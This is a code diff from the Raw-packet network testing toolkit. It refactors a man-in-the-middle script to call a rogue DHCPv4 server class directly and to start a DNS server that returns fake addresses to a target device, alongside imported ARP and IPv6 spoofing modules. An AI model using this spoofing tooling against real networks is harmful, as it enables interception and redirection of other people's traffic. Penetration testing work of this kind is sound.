@@ -11,11 +11,21 @@ Copyright 2020, Raw-packet Project
 # endregion
 
 # region Import
+from raw_packet.Utils.base import Base
+from raw_packet.Utils.tm import ThreadManager
+from raw_packet.Utils.network import RawSniff
+
+from raw_packet.Scanners.scanner import Scanner
+from raw_packet.Scanners.arp_scanner import ArpScan
+from raw_packet.Scanners.icmpv6_scanner import ICMPv6Scan
+
+from raw_packet.Servers.dns_server import DnsServer
+from raw_packet.Servers.dhcpv4_server import DHCPv4Server
+
 from raw_packet.Scripts.Others.ncc import NetworkConflictCreator
 from raw_packet.Scripts.ARP.arp_spoof import ArpSpoof
 from raw_packet.Scripts.IPv6.ipv6_spoof import IPv6Spoof
-from sys import path as sys_path
-from os.path import dirname, abspath
+
 from prettytable import PrettyTable
 from os import path, makedirs, stat
 from shutil import copyfile, copytree
@@ -136,9 +146,11 @@ def rogue_dhcp_server(network_interface: str = 'eth0',
                       ip_address: str = '129.168.0.1'):
 
     # Start DHCP rogue server
-    sub.Popen(['python3 ' + project_root_path + '/Scripts/DHCPv4/dhcp_rogue_server.py --interface ' + network_interface +
-               ' --target_ip ' + ip_address + ' --target_mac ' + mac_address + ' --apple --quiet &'],
-              shell=True)
+    dhcpv4_server: DHCPv4Server = DHCPv4Server(network_interface=network_interface)
+    dhcpv4_server.start(target_mac_address=mac_address,
+                        target_ipv4_address=ip_address,
+                        apple=True, quit=True,
+                        exit_on_success=True)
 
     # Wait 3 seconds
     sleep(3)
@@ -184,21 +196,18 @@ def start_dns_server(network_interface: str = 'eth0',
                      technique_index: int = 1,
                      fake_ip_address: str = '129.168.0.2',
                      mitm_success_domain: str = 'test.com'):
-
     if technique_index in [1, 2, 3]:
-        dns_server.listen(listen_network_interface=network_interface,
-                          target_mac_address=mac_address,
-                          fake_answers=True,
-                          fake_ipv4_addresses=[fake_ip_address],
-                          success_domains=['captive.apple.com', mitm_success_domain])
+        dns_server.start(target_mac_address=mac_address,
+                         fake_answers=True,
+                         fake_ipv4_addresses=[fake_ip_address],
+                         success_domains=['captive.apple.com', mitm_success_domain])
 
     if technique_index in [4, 5, 6]:
-        dns_server.listen(listen_network_interface=network_interface,
-                          target_mac_address=mac_address,
-                          fake_answers=True,
-                          fake_ipv4_addresses=[fake_ip_address],
-                          listen_ipv6=True,
-                          success_domains=['captive.apple.com', mitm_success_domain])
+        dns_server.start(target_mac_address=mac_address,
+                         fake_answers=True,
+                         fake_ipv4_addresses=[fake_ip_address],
+                         listen_ipv6=True,
+                         success_domains=['captive.apple.com', mitm_success_domain])
 # endregion
 
 
@@ -323,24 +332,12 @@ def kill_processes(quit: bool = False) -> None:
 # region Main function
 if __name__ == '__main__':
 
-    # region Import Raw-packet classes
-    project_root_path = dirname(dirname(dirname(abspath(__file__))))
-    sys_path.append(project_root_path)
-    from raw_packet.Utils.base import Base
-    from raw_packet.Scanners.scanner import Scanner
-    from raw_packet.Scanners.arp_scanner import ArpScan
-    from raw_packet.Scanners.icmpv6_scanner import ICMPv6Scan
-    from raw_packet.Utils.tm import ThreadManager
-    from raw_packet.Utils.network import RawSniff
-    from raw_packet.Servers.dns_server import RawDnsServer
-    # endregion
-
     # region Init Raw-packet classes
     base: Base = Base()
     scanner: Scanner = Scanner()
     arp_scan: ArpScan = ArpScan()
     icmpv6_scan: ICMPv6Scan = ICMPv6Scan()
-    dns_server: RawDnsServer = RawDnsServer()
+    dns_server: DnsServer = DnsServer()
     thread_manager: ThreadManager = ThreadManager(5)
     # endregion
 
